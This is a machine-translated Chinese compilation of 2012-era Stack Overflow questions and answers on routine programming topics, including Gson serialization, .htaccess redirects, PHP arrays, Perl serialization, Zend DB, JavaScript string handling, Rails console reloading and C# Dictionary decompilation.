wrapper.setPhoto(new DinosaurPhoto());
String wrapper_json = mapper.writeValueAsString(wrapper);
Wrapper wrapper_from_json = mapper.readValue(wrapper_json,Wrapper.class); 
```

Gson 承诺他们将在未来的版本中解决这个问题，但到目前为止他们还没有解决这个问题。如果这对您的应用程序非常重要，我建议您移植到杰克逊。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-05T04:55:55.500

我通过编译一个 groovy 属性类来构建一个原始接口 shim 生成器，以与 GWT Autobeans 模型进行互操作。这是目前回避 ASM/cglib 学习曲线的一种非常粗略的方法。背景：使用 Autobeans，您只能使用接口，而 sun.* 代理对于我尝试过的所有访问尝试都无法使用 gson 互操作。但是，当 groovy 类加载器是 GsonBuilder 的本地时，事情会变得容易一些。请注意，除非 gsonBuilder 注册实际上是从 groovy 本身中调用的，否则这将失败。

访问垫片工厂创建一个作为单例名称 JSON_SHIM 并调用

> JSON_SHIM.getShim("{}",MyInterface.class)

如果需要注册并创建一个 [空白] 实例。如果您的接口中有接口，则必须在使用前预先注册这些接口。这足以将*平面*Autobeans 与 gson 一起使用，而不是整个框架。这个生成器中没有 groovy 代码，所以有 javassist-foo 的人可以重复实验。

```
import com.google.gson.GsonBuilder;
import com.google.gson.InstanceCreator;
import com.google.gson.internal.bind.ReflectiveTypeAdapterFactory;
import groovy.lang.GroovyClassLoader;
import org.apache.commons.beanutils.PropertyUtils;

import java.beans.PropertyDescriptor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Type;
import java.util.LinkedHashMap;
import java.util.Map;

public class GroovyGsonShimFactory {
  private  Map<Class, Method> shimMethods = new LinkedHashMap<>();

  private void generateGroovyProxy(Class ifaceClass) {
    String shimClassName = ifaceClass.getSimpleName() + "$Proxy";
    String ifaceClassCanonicalName = ifaceClass.getCanonicalName();
    String s = "import com.google.gson.*;\n" +
        "import org.apache.commons.beanutils.BeanUtils;\n" +
         "import java.lang.reflect.*;\n" +
        "import java.util.*;\n\n" +
        "public class "+shimClassName+" implements "+ifaceClassCanonicalName+" {\n" ;

    {
      PropertyDescriptor[] propertyDescriptors = PropertyUtils.getPropertyDescriptors(ifaceClass);
      for (PropertyDescriptor p : propertyDescriptors) {
        String name = p.getName();
        String tname = p.getPropertyType().getCanonicalName();
        s += "public " + tname + " " + name + ";\n";
        s += " " + p.getReadMethod().toGenericString().replace("abstract", "").replace(ifaceClassCanonicalName + ".", "") + "{return " + name + ";};\n";
        Method writeMethod = p.getWriteMethod();
        if (writeMethod != null)
          s += " " + writeMethod.toGenericString().replace("abstract", "").replace(ifaceClassCanonicalName + ".", "").replace(")", " v){" + name + "=v;};") + "\n\n";
      }
    }
    s+=        "  public static "+ifaceClassCanonicalName+" fromJson(String s) {\n" +
        "    return (" +ifaceClassCanonicalName+
        ")cydesign.strombolian.server.ddl.DefaultDriver.gson().fromJson(s, "+shimClassName+".class);\n" +
        "  }\n" +  
        "  static public interface foo extends InstanceCreator<"+ifaceClassCanonicalName+">, JsonSerializer<"+ifaceClassCanonicalName+">, JsonDeserializer<"+ifaceClassCanonicalName+"> {}\n" +
        "  static {\n" +
        "    cydesign.strombolian.server.ddl.DefaultDriver.builder().registerTypeAdapter("+ifaceClassCanonicalName+".class, new foo() {\n" +
        "      public "+ifaceClassCanonicalName+" deserialize(JsonElement json, Type typeOfT, JsonDeserializationContext context) throws JsonParseException {\n" +
        "        return context.deserialize(json, "+shimClassName+".class);\n" +
        "      }\n" +
        "\n" +
        "      public "+ifaceClassCanonicalName+" createInstance(java.lang.reflect.Type type) {\n" +
        "        try {\n" +
        "          return new "+shimClassName+"();\n" +
        "        } catch (Exception e) {\n" +
        "          e.printStackTrace(); \n" +
        "        }\n" +
        "        return null;\n" +
        "      }\n" +
        "\n" +
        "      @Override\n" +
        "      public JsonElement serialize("+ifaceClassCanonicalName+" src, Type typeOfSrc, JsonSerializationContext context) {\n" +
        "        LinkedHashMap linkedHashMap = new LinkedHashMap();\n" +
        "        try {\n" +
        "          BeanUtils.populate(src, linkedHashMap);\n" +
        "          return context.serialize(linkedHashMap);\n" +
        "        } catch (Exception e) {\n" +
        "          e.printStackTrace(); \n" +
        "        }\n" +
        "\n" +
        "        return null;\n" +
        "      }\n" +
        "    });\n" +
        "  }\n\n" +
        "};";

    System.err.println("" + s);
    ClassLoader parent = DefaultDriver.class.getClassLoader();
    GroovyClassLoader loader = new GroovyClassLoader(parent);

    final Class gClass = loader.parseClass(s);
    try {
      Method shimMethod = gClass.getMethod("fromJson", String.class);
      shimMethods.put(ifaceClass, shimMethod);
    } catch (NoSuchMethodException e) {
      e.printStackTrace(); 
    }

  }

  public <T> T getShim(String json, Class<T> ifaceClass) {
    if (!shimMethods.containsKey(ifaceClass))
      generateGroovyProxy(ifaceClass);
    T shim = null;//= gson().shimMethods(json, CowSchema.class);
    try {
      shim = (T) shimMethods.get(ifaceClass).invoke(null, json);
    } catch (IllegalAccessException | InvocationTargetException e) {
      e.printStackTrace(); 
    }
    return shim;
  }
} 
```

# .htaccess - htaccess 重定向问题（一个域上的页面到另一个域的同一页面）

> ID：11235877
> 
> 赞同：1
> 
> 时间：2012-06-27T22:51:25.827
> 
> 标签：.htaccess, redirect

我正在尝试将一些页面重定向到一个新域，我之前已经这样做过，但由于某种原因，我无法让代码正常工作。

```
RewriteEngine On
Redirect 301 http://domain.com/page1.html http://domain2.com/page1.html 
```

谁能看到我哪里出错了？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:55:43.767

在 .htaccess 文件中，以下代码将确保您旧域的所有目录和页面都将正确重定向到新域。

.htaccess 文件需要放在你旧网站的根目录下

```
Options +FollowSymLinks
RewriteEngine on
RewriteRule (.*) http://www.newdomain.com/$1 [R=301,L] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T23:01:27.980

既然你说你只想引导你的几个页面而不是所有页面，你可以这样做：

```
RewriteEngine On
Redirect /~myaccount/oldpage.html http://www.newsite.com/newpage.html 
```

您指定当前服务器上页面的路径，后跟要重定向到的 URL。

或者你可以这样做：

```
RedirectMatch 301 ^/oldpage\.html$ http://www.newsite.com/newpage.html 
```

# php - 在php中重新排列数组

> ID：11235878
> 
> 赞同：0
> 
> 时间：2012-06-27T22:51:34.690
> 
> 标签：php, arrays

我有一个问题，例如，具有 0 10 个索引的数组，我删除了第 0 个索引，现在它就像 1 到 10，当我显示这个数组时，第 0 个位置有一个空列。我想将此数组重新排列为 0 到 9。目的是数组构造我的网格，第 0 个位置用于编辑，如果用户没有权限，那么我取消设置第 0 个元素。如何将我的数组重新排列为 0 到 9

样本数组结构就像

```
[fields] => Array
    (
        [1] => Array
            (
                [header] => Array
                    (
                        [fieldName] => OFFERID
                        [displayName] => History
                        [width] => 70
                    )

                [visibility] => Array
                    (
                        [showOnStart] => 1
                        [editable] => 
                    )

                [cell] => Array
                    (
                        [type] => raw
                        [params] => Array
                            (
                                [text] => <a href="javascript:void(0);" id="{{OFFERID}}" class="btnHistory">History</a>
                            )

                    )

                [sort] => Array
                    (
                        [sortable] => 1
                    )

                [validator] => Array
                    (
                        [name] => 
                        [params] => 
                    )

            )

        [2] => Array
            (
                [header] => Array
                    (
                        [fieldName] => OFFERID
                        [displayName] => Offer Id
                        [group] => 0
                    ) 
```

谢谢亚历克斯

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-27T22:54:44.437

有几种方法可以做到这一点，这里有两个最短的（[`array_values()`](http://php.net/manual/en/function.array-values.php)/ [`array_merge()`](http://php.net/manual/en/function.array-merge.php)）：

```
$array = array_values($array);
// or
$array = array_merge($array); 
```

但是您可能会考虑使用[`array_shift()`](http://php.net/manual/en/function.array-shift.php)//从数组中删除项目，而不是（可能）将其删除[`array_pop()`](http://php.net/manual/en/function.array-pop.php)-这些会自动将所有键转换为连续的 0 索引顺序。[`array_splice()`](http://php.net/manual/en/function.array-splice.php)`unset()`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-27T22:57:52.830

您可以使用[`array_splice`](http://www.php.net/array_splice)删除数组的一部分。

`array array_splice ( array &$input , int $offset [, int $length = 0 [, mixed $replacement ]] )`

例如：

```
$array = array(0 => "a", 1 => "b", 2 => "c");
array_splice($array, 0, 1);
var_dump($array); 
```

将输出：

```
array(2) {
  [0]=> string(1) "b"
  [1]=> string(1) "c"
} 
```

请注意，它将按照您的要求重新索引您的数组。

# opencv - 如何获得 cvMat 的深度和通道？

> ID：11235879
> 
> 赞同：2
> 
> 时间：2012-06-27T22:51:35.563
> 
> 标签：opencv

我正在使用 fromArray() 函数将 numpy 数组转换为 cvMat。现在，当我尝试对其应用阈值时，出现以下错误 OpenCV 错误：阈值中不支持的格式或格式组合 ()

在检查 stackoverflow 时，我发现这可能是我图像的通道或深度的问题。但我不确定如何检查 cvMat。有人可以告诉我如何在 python 中检查 cvMat 的深度和通道数。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-25T23:02:23.467

好吧，你不能直接从 cvMat 得到它，因为 cvMat 有类型而不是深度/通道，所以

```
print mymat.type 
```

返回类型代码。如果要获取深度和通道号，我发现的最简单方法是使用 cv.GetImage 生成 IplImage 标头，例如

```
print cv.GetImage(mymat).depth,cv.GetImage(mymat).nChannels 
```

我相信 cv2 消除了所有 IplImage/cvMat 的东西，并将它们全部放入 Mat 中。

# android - 测试混合 Android 应用程序（获取 WebView 组件）

> ID：11235882
> 
> 赞同：1
> 
> 时间：2012-06-27T22:52:03.320
> 
> 标签：android, testing, webview, hybrid

我正在创建一个混合 Android 应用程序。也就是说，大部分工作都是在 HTML5、CSS 和 JavaScript 中完成的，我们的应用程序本质上是一个全屏 WebView。我广泛使用 android JavaScript 桥在原生 Android 和 WebView 之间来回交流。

现在开始测试。测试这座桥的最佳方法是什么？在我的测试中控制 HTML 元素的最干净的方法是什么？假设我有一个 HTML5 按钮。我如何点击它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-01-02T05:53:00.913

试试葫芦。之前我使用它来测试在 webview 中呈现的 HTML。

[https://github.com/calabash/calabash-ios](https://github.com/calabash/calabash-ios)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-19T09:04:30.350

尝试查看[MonkeyTalk](http://www.gorillalogic.com/testing-tools/monkeytalk)，它支持测试混合应用程序。虽然他们的记录器不起作用，但您可以手动修改测试脚本以与 html 元素交互。

此处的更多文档： [http ://www.gorillalogic.com/testing-tools/monkeytalk/documentation/scripting-hybrid-nativehtml-apps](http://www.gorillalogic.com/testing-tools/monkeytalk/documentation/scripting-hybrid-nativehtml-apps)

# ios - 正在下载 plist，但似乎每次都得到一个缓存版本

> ID：11235883
> 
> 赞同：1
> 
> 时间：2012-06-27T22:52:05.700
> 
> 标签：ios, caching, plist

我的服务器上有一个为应用程序提供的 plist。启动时，应用程序会下载 plist 并检查一些内容，然后再继续启动。

我遇到的问题是，当我更新服务器上的 plist 时，该应用程序似乎每次都下载旧版本。至少从控制台日志中，我没有看到我在 plist 中所做的更新。我正在更新一个整数以检查并与已安装的文件进行比较，但该整数不会更改为新的整数。

我不确定我的服务器（某些托管公司）是否提供缓存版本 - 在浏览器中或通过 FTP 查看文件时，这很好，并且是新更新的整数 - 或者问题是否与应用程序有关？我正在使用 AFNetworking，是否正在进行一些疯狂的缓存？

非常感谢任何建议。

**更新：**我只是试图删除服务器上的文件并重新启动应用程序，控制台仍然输出文件......似乎应用程序中有一些奇怪的缓存，不是吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-29T12:25:03.780

我还没有使用过 AFNetworking（还没有！），但不久前我在使用 NSURLRequest 时遇到了类似的问题，我发现使用`requestWithURL:cachePolicy:timeoutInterval:`和指定缓存策略创建请求不仅仅是`requestWithURL:` 解决我的问题。

例如`NSURLRequest *urlRequest = [NSURLRequest requestWithURL:downloadURL cachePolicy:NSURLRequestReloadIgnoringLocalCacheData timeoutInterval:60];`

我希望这有帮助。

# perl - PHP::Serialization 在尝试序列化 HTTP::Response 时出错

> ID：11235885
> 
> 赞同：1
> 
> 时间：2012-06-27T22:52:26.600
> 
> 标签：perl, serialization

[PHP::Serialization](http://search.cpan.org/perldoc/PHP%3a%3aSerialization)在尝试序列化[HTTP::Response](http://search.cpan.org/perldoc/HTTP%3a%3aResponse)时会出错。

示例如下。有什么提示吗？

```
#!/usr/bin/perl -w

use strict ;
use warnings ;
use LWP ; 
use PHP::Serialization qw(serialize unserialize); 

my $url = 'http://stackoverflow.com/' ; 
my $ua  = LWP::UserAgent->new() ;
my $page = $ua->get($url) ; 

print "HTML page is ". length($page)." bytes long.\n" ; 
print $page ; print "\n" ; 

my $buffer ; 
eval { $buffer = serialize($page); } ; die $@ if $@ ;    

open FH, '>stored.dat' or die "Cannot create store file $!" ; 
binmode FH ; 
print FH $buffer ; 
close FH ; 
```

执行给出：

```
HTML 页面长 30 个字节。
HTTP::响应=哈希（0x901f110）
不是 /usr/local/share/perl/5.10.1/PHP/Serialization.pm 第 454 行的 HASH 参考。
```

在我的序列化/反序列化实验中更进一步，我尝试了 FreezeThaw
包。正如您在以下代码段中看到的那样，它可以工作，但我遇到了另一个问题。
重建（反序列化）对象没有类型，因此我不能使用它的方法。我也不能
“祝福”它，因为它是“非参考”。

我应该如何解决这个问题？

```
#!/usr/bin/perl -w

use strict ;
use warnings ;
use HTML::Parser ; 
use HTML::Form ; 
use HTTP::Response ; 
use LWP ; 

use FreezeThaw qw(freeze thaw cmpStr safeFreeze cmpStrHard);

my $url = 'http://stackoverflow.com/' ; 
my $ua  = LWP::UserAgent->new() ;
my $page = $ua->get($url) ; 

print "HTML page is ". length($page)." bytes long.\n" ; 
print $page ; print "\n" ; 
print $page->status_line(), "\n" ; 

my $buffer ; 
eval { $buffer = freeze($page); } ; die $@ if $@ ;    

print "Serdes buffer is ". length($buffer)." bytes long.\n" ; 

open FH, '>stored.dat' or die "Cannot create store file $!" ; 
binmode FH ; 
print FH $buffer ; 
close FH ; 

my $otherb ; 
open FH, '<stored.dat' or die "Cannot open store file $!" ; 
binmode FH ; 
$otherb = do { local($/); <FH> } ; 
close FH ; 

print "Serdes buffer is ". length($otherb)." bytes long.\n" ; 

my $proto = HTTP::Response->new() ; 
my $recpg ; 

eval { $recpg = thaw ($otherb); } ; die $@ if $@ ; 

print $recpg ; 
#bless $recpg, ref($proto)||$proto ; 
bless $recpg, "HTTP::Response" ; 
print $recpg ; 

#print $recpg->status_line(), "\n" ; 
```

执行给出：

```
% ./serdesLab2.pl 
HTML page is 30 bytes long.
HTTP::Response=HASH(0x970ea10)
200 OK
Serdes buffer is 214347 bytes long.
Serdes buffer is 214347 bytes long.
Can't bless non-reference value at ./serdesLab2.pl line 45.
1% 
% 
```

感谢您提供任何可能的解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T01:29:29.503

当你这样做

```
my $page = $ua->get($url); 
```

你得到一个`HTTP::Response`对象。您需要调用该`$response->content`方法来获取响应的内容。

```
my $response = $ua->get($url);
die "didn't get a page: ".$response->status_line."\n" unless $response->is_success;
my $page = $response->content; 
```

错误消息抱怨 PHP::Serialize 不知道如何序列化不是普通 perl HASH/ARRAY ref 的东西（在这种情况下可能是 CODE ref）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T01:41:55.027

`HTTP::Response`和/或`HTTP::Request`对象（我不记得是哪个）有一个成员`_uri`，通常是[URI](http://search.cpan.org/perldoc/URI)。该对象是一个祝福的标量参考。

环顾报告错误的行，似乎`PHP::Serialization`认为所有对象都是基于哈希的。因此，当它遇到一个受祝福的标量参考对象时，它会窒息。

笔记：

> `=head1 TODO`
> 
> 支持不同的对象类型

我不知道能够建议补丁的序列化格式，但修复看起来像：

```
elsif ( $type eq 'obj' ) {
    my $class = ref($val);
    $class =~ /(\w+)$/;
    my $subclass = $1;

    my $reftype = reftype $val;
    if ($reftype eq 'HASH') {
        # blessed hash serialization
    }
    elsif ($reftype eq 'ARRAY') {
        # blessed array serialization
    }
    elsif ($reftype eq 'SCALAR') {
        # blesssed scalar serialization
    }
    elsif ($reftype eq 'CODE') {
        # blessed coderef serialization
    }
    elsif ($reftype eq 'GLOB') {
        # blessed globref serialization
    }
    else {
        # etc etc
    } 
```

哪里`reftype`来自[Scalar::Util](http://search.cpan.org/perldoc/Scalar::Util)。事实上，如果只是在遇到不支持的类型时发牢骚，填充这些分支或将其转换为调度表会很有用。

# zend-framework - Zend DB 更新中的 OR 子句？

> ID：11235888
> 
> 赞同：5
> 
> 时间：2012-06-27T22:53:39.413
> 
> 标签：zend-framework, zend-db, zend-db-table

我想使用 OR 子句进行 Zend db 更新。什么是等效的声明：

```
UPDATE mail
SET message_read = 1
WHERE id = 5
OR id = 10 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-27T23:30:37.073

调用时`Zend_Db_Adapter::update()`，多个`WHERE`条件会自动组合使用`AND`（函数_whereExpr中Zend/Db/Adapter/Abstract.php第698行）。

你可以通过创建你自己的`Zend_Db_Expr`作为`WHERE`条件来解决这个问题，并且它将保持不变。

例如：

```
$where[] = new Zend_Db_Expr(
        $table->getAdapter()->quoteInto('id = ?', 5) . ' OR ' .
        $table->getAdapter()->quoteInto('id = ?', 10)
);

// resulting expression:
//   WHERE (id = 5 OR id = 10)

$table->update($data, $where); 
```

如果您有其他`WHERE`条件，它们将`OR`通过`AND`.

例子：

```
$where[] = new Zend_Db_Expr(
        $table->getAdapter()->quoteInto('id = ?', 5) . ' OR ' .
        $table->getAdapter()->quoteInto('id = ?', 10)
);
$where[] = $table->getAdapter()->quoteInto('type = ?', 'sometype');

// resulting expression:
//   WHERE (id = 5 OR id = 10) AND (type = 'sometype') 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-28T12:40:47.147

->where() 将在查询中添加一个 where 子句并放置一个“AND”。有一个 orWhere 方法可以做到这一点。

```
$select = $this->select();
$select->where('id = 5');
$select->orWhere('id = 10');

$this->fetchAll($select); 
```

# javascript - 在 Javascript 中保护 API 密钥

> ID：11235889
> 
> 赞同：1
> 
> 时间：2012-06-27T22:53:40.887
> 
> 标签：javascript, security, cakephp, api-key

我正在为一个网站构建一个支付插件，用户可以在其中用真钱购买一些网站实习生货币。我使用的处理付款过程的后端是[这个](http://www.payone.de/)。它（除其他外）提供了一个 JavaScript 库来与他们的 API 进行通信，因此您不必让您的系统接触敏感的支付数据，如信用卡号码等。

问题是：目前，api-key、秘密哈希和其他易受攻击的数据被硬编码到我的脚本中，该脚本启动了与服务器的通信。所以理论上每个半血统用户都可以将它们从浏览器中复制出来，并可以用它做讨厌的事情，特别是如果他们可以访问 api 文档。

所以，这是不安全的，它绝对不能以这种方式生活。

我正在使用 cakephp，我想在按下提交按钮后通过对我的控制器/模型的一些 ajax 调用来收集那些敏感的键。问题是，这种连接不安全，很容易成为“中间人”。

还有其他更好的方法来保护我在 javascript 中的 API 密钥吗？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-06-28T00:55:31.143

使用基于令牌的身份验证、https 和 csrf 令牌，永远不要使用客户端上的秘密。

使用 oauth，这样用户甚至不需要向您发送密码。使用别人的认证系统。

# javascript - 在Javascript中使用逗号而不是+来连接原始类型有什么好处吗？

> ID：11235903
> 
> 赞同：0
> 
> 时间：2012-06-27T22:54:44.180
> 
> 标签：javascript

`+`我已经看到逗号在 Javascript 中连接原始数据类型，并且想知道使用逗号与说运算符以及 .concat() 函数是否有任何区别？

所以下面的例子给了我 abc

```
var value1 = a, value2 = b, value3 = c;
document.write(value1,value2,value3); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-27T23:25:35.337

苹果和橙子。您的示例中没有连接任何内容；您只需为`write()`函数指定 3 个参数。

`document.write(exp1, exp2, exp3, ...)`接受多个参数，当给定多个参数时，它将遍历所有参数，就像您`write()`单独调用每个参数一样。

但是，逗号在评估表达式时确实有用，它用于处理多个表达式并返回最后一个。要查看实际情况，您需要将参数包装在一组括号中，以便形成单个参数：

```
document.write("a","b","c") // abc
document.write( ("a", "b", "c") )  // c 

alert("a","b","c") // a
alert( ("a","b","c") ) // c
alert( (x=2, ++x) ) // 3 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T23:30:03.553

由于字符串连接是计算中最繁琐的操作之一，因此使用`document.write`各种参数会表现得更好。

看这个测试（它有时会在 IE 中挂起，所以请使用其他浏览器）[http://jsperf.com/document-write-vs-concatenation](http://jsperf.com/document-write-vs-concatenation)

解释：

```
document.write("val1", "val2", "val3"); 
```

相当于

```
document.write("val1");
document.write("val2");
document.write("val3"); 
```

因此，速度要快得多，因为它不会连接字符串。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T00:04:25.537

在大多数浏览器（IE <= 8，Gecko）中，使用 + 运算符的字符串连接性能很差。

例如，在我的公司中，我们必须一块一块地编写一个大的 HTML 片段。在这种情况下，我们有这样的事情：

```
var id = 123;
var html = [];
html.push('<div id="', id, '">hello</div>');
var result = html.join(''); 
```

在你有很多连接的情况下，这比下面的要好得多：

```
var id = 123;
result = '<div id="' + id + '">hello</div>'; 
```

所以要回答你的问题 - 这真的取决于情况。如果你将许多字符串连接在一起，你不应该使用 + 运算符，因为性能很差。但是在 99% 的情况下，性能提升是如此之小，以至于尝试其他任何东西都会很痛苦，这应该没问题。但是如果您实际上可以选择逗号分隔（例如在 array.push 或 document.write 的情况下），那么您绝对应该利用它。

# ruby-on-rails - “重新加载！”的原因是什么？在 Rails 控制台中似乎并不总是有效？

> ID：11235905
> 
> 赞同：16
> 
> 时间：2012-06-27T22:54:44.767
> 
> 标签：ruby-on-rails, console

我刚刚掌握了 Rails 控制台的窍门，并发现它对于在我的课程中快速测试方法很有用。我知道我可以更改我的模型，然后

```
> reload! 
```

获取这些更新，但有时我会发现它似乎没有重新加载我的最新代码。Rails 是否在某处缓存代码？

在一个非常简单的伪示例中，我可能在第 100 行有错误的代码：

```
100: u = User.alll 
```

在 Rails 控制台中，当我运行此方法时，可能会收到类似于以下内容的错误：

```
NoMethodError: undefined method `alll' for User:Class ... on line 100 
```

然后修改我的代码，修复错误

```
100: u = User.all 
```

然后重新加载：

```
> reload! 
```

然后，当调用这个类中具有正确代码的方法时，它仍然会说

```
NoMethodError: undefined method `alll' for User:Class ... on line 100 
```

显然，错误已修复，并且违规行甚至不再位于第 100 行。有没有办法强制/硬重置“重新加载！” 命令？

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-06-27T23:16:37.523

我的猜测是你正在做类似的事情：

1.  创建一个实例`User`
2.  调用`someMethod`实例
3.  你得到一个错误，你去修复它
4.  `reload!`
5.  您调用`someMethod` *现有实例*并再次收到错误

所以你在一个本身没有被重新加载的实例上调用该方法。它的类已被重新加载，但实例已经在内存中 - 有错误和所有。

至少这是我的猜测（不是 100% 肯定）。

关键是，如果您在 之后创建一个新实例*并*在该`reload!`新实例上调用您的方法，它应该停止抱怨。

# javascript - 将展平的键->值对转换为嵌套对象

> ID：11235906
> 
> 赞同：3
> 
> 时间：2012-06-27T22:54:45.903
> 
> 标签：javascript, parsing, eval

将以下键->值对象“数组”转换为正确的“JSON”样式对象的最简单方法是什么？下面的示例将输入转换为图形。

```
var input = {
    "graph.default.seriesColor" : ["#cccccc", "#3c3c3c"],
    "graph.default.stackSeries" : false,
    "graph.default.title.text" : "Hello!",
    "graph.default.title.show" : false,
    "graph.default.axesDefaults.show" : true,
    "graph.default.axesDefaults.min" : 17,
    "graph.default.axesDefaults.max" : 20,
};

var graph = {
    default: {
        seriesColor: ["#cccccc", "#3c3c3c"],
        stackSeries: false,

        title: {
            text: "Hello!",
            show: false
        },

        axesDefault: {
            show: true,
            min: 17,
            max: 20
        }
    }
}; 
```

我考虑过使用 eval，但是它很快就以递归的方式变得复杂了。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-27T23:08:07.120

出于某种原因，我真的很想为此编写一个函数：

```
function makeObj(input)
{
    var output = {};

    for(var key in input)
    {
        var nodes = key.split('.'), dest = output;

        if(nodes.length < 1)
            continue;

        for(var i = 0; i < (nodes.length - 1); ++ i)
        {
            var node = nodes[i];

            dest = (dest[node] === undefined) ?
                        (dest[node] = {}) : dest[node];
        }

        dest[nodes[nodes.length - 1]] = input[key];
    }

    return output;
}

graph = makeObj(input); 
```

显然与`eval`解决方案不同，这只会接受您描述的确切格式（xyz）的字符串。

# ruby-on-rails - MMDDYY 到 ISO 时间戳：Ruby on Rails

> ID：11235913
> 
> 赞同：2
> 
> 时间：2012-06-27T22:55:28.687
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, mongodb

我有一个使用 MongoDB 进行数据存储的 Ruby on Rails 应用程序。Mongoid::Timestamp 会在记录更新时自动创建 ISODate 时间戳`created_at`。`updated_at`

给定用户以`MM DD YY`（三个表单字段）的形式输入，我如何从中创建 ISODate 以添加`completed_at`记录条目？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T23:11:14.587

前几天我不得不手动编写格式的代码（在 Ruby 1.8.7 中），但是 Ruby 1.9.2 支持 ISO 日期格式：

```
require 'date'

time = DateTime.parse(input_string).to_time # make a new time object; parsing a string
time.strftime("%F") # %F is the ISO8601 formatting standard 
```

（更多粒度；请参阅[http://www.ruby-doc.org/core-1.9.3/Time.html#method-i-strftime](http://www.ruby-doc.org/core-1.9.3/Time.html#method-i-strftime)）

# java - 字符串到字节

> ID：11235914
> 
> 赞同：0
> 
> 时间：2012-06-27T22:55:29.047
> 
> 标签：java

我正在尝试将字符串转换为具有 2 个不同字节的字节数组。例如：`String s1 = " 055E"`我需要将其转换为like

```
byte b1 = Integer.parseInt(05,16);  -  1byte

byte b2 = Integer.parseInt(5E,16);   -  1byte 
```

最后我需要一个字节数组，它的值将是 b1，b2。

```
byte[] b = {b1, b2}; 
```

对此的任何帮助将不胜感激。提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:58:38.197

试试这个：

```
String s1 = " 055E";
s1 = s1.trim();
byte[] b = {
    (byte) Integer.parseInt(s1.substring(0, 2), 16),
    (byte) Integer.parseInt(s1,substring(2), 16)
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-06-27T22:58:37.030

首先为数组分配足够的内存。然后遍历每一对字符并将它们转换为一个字节。将结果存储在数组中。

```
s = s.trim();
byte[] b = new byte[s.length()/2];

for(int i = 0; i < s.length(); i+= 2) {
    b[i/2] = Byte.parseByte(s.substring(i,i+2),16);
} 
```

# jquery - jqGrid重新加载问题

> ID：11235915
> 
> 赞同：0
> 
> 时间：2012-06-27T22:55:42.207
> 
> 标签：jquery

我正在寻找一种将功能分配给“重新加载网格”按钮的方法。我知道有这个符号触发器（“reloadGrid”），但我希望能够为重新加载指定一个方法调用。

我试图用这个来实现：我有两个网格，都填充了一个 ajax 调用。两个网格都是只读的。出于某种原因，在搜索、排序和重新排序网格后，重新加载按钮会重新加载网格，但不会按照原来的顺序加载。我希望如果我可以重新加载以获取填充网格的功能，那么重新加载将与原始的第一个视图相同。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T16:58:09.803

我在这里找到了答案。过程是：隐藏给定的刷新按钮，并添加一个具有新功能的新按钮。 [答案链接](https://stackoverflow.com/questions/7067439/reload-of-jqgrid-not-happening-with-loadoncetrue/7067579#7067579)

# c# - 这个 C# Dictionary<,> 优化的意义何在？

> ID：11235917
> 
> 赞同：9
> 
> 时间：2012-06-27T22:55:54.110
> 
> 标签：c#

我正在使用 C# 4.0。Visual Studio 中的“优化代码”已打开。

在一个类中考虑以下代码：

```
Dictionary<int, int> dictionary = new Dictionary<int, int>();

public void IncrementDictionary(int key) {
    if (!dictionary.ContainsKey(key)) {
        dictionary[key] = 1;
    } else {
        dictionary[key]++;
    }
} 
```

在这里，调用`IncrementDictionary`做两件事之一：

*   如果 不存在`key`值，则创建一个值并将其初始化为 1。
*   如果存在值，则该值增加 1。

现在看看当我使用 ILSpy 反编译结果时会发生什么：

```
Dictionary<int, int> dictionary = new Dictionary<int, int>();

public void IncrementDictionary(int key) {
    if (!dictionary.ContainsKey(key)) {
        dictionary[key] = 1;
        return;
    }
    Dictionary<int, int> dictionary2;
    (dictionary2 = dictionary)[key] = dictionary2[key] + 1;
} 
```

**注意：**在使用这个的实际生产代码中，优化器/编译器还在最后一行创建：`int key2 = key;`和使用`key2`。

好的，`var`已替换为`Dictionary<int, int>`，这是预期的。并且该`if`语句被简化为添加 a`return`而不是使用`else`.

**但是，为什么要创建对原始字典的新引用呢？**

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-27T22:58:41.167

我猜这可能是为了避免竞争条件，如果你有：

`dictionary[i] = dictionary[i] + 1`

它不是原子的。在您获得值并递增*后*`dictionary`，分配给的对象可能会发生变化。

 *想象一下这段代码：

```
public Dictionary<int, int> dictionary = new Dictionary<int, int>();

public void Increment()
{
    int newValue = dictionary[0] + 1;
    //meanwhile, right now in another thread: dictionary = new Dictionary<int, int>();
    dictionary[0] = newValue; //at this point, "dictionary" is actually pointing to a whole new instance
} 
```

使用他们拥有的局部变量赋值，它看起来更像是为了避免这种情况：

```
public void IncrementFix()
{
    var dictionary2 = dictionary;
    //in another thread: dictionary = new Dictionary<int, int>();
    //this is OK, dictionary2 is still pointing to the ORIGINAL dictionary
    int newValue = dictionary2[0] + 1;
    dictionary2[0] = newValue;
} 
```

